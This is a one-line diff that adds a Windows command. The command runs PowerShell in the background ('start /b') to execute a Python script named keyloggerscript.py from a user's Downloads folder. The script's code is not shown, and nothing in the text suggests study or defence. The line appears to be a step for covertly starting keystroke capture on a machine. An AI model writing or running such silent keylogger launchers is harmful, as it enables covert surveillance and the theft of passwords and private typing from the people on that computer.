@@ -1,0 +1,1 @@
+start /b powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py
